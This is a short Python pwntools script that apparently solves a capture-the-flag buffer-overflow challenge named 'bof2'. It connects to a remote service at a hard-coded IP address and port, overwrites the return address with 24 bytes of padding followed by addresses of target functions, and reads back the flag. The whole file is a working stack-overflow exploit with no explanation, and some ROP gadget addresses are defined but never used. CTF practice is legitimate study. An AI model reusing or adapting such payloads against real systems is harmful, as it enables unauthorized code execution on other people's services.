from pwn import *

# nc 13.214.30.13 10003

HOST = "13.214.30.13"
REMOTE = "10003"
p = remote(HOST, REMOTE)

offeset = 24
vuln = 0x00000000004006d7
pop_rdi = 0x0000000000400883
puts_at_plt = 0x0000000000400580
cabecabe = 0x0000000000400752
main = 0x00000000004007e1

# p = process("./bof2")

print(p.recvuntil(b"\n"))
# print(p64(vuln))
payload = 'A' * offeset
payload = payload.encode()
payload += p64(cabecabe)
payload += p64(vuln)

p.sendline(payload.strip())

p.recvline()
p.recvline()
p.recvline()
p.recvline()
flag = p.recvuntil(b"}").decode()
print(flag)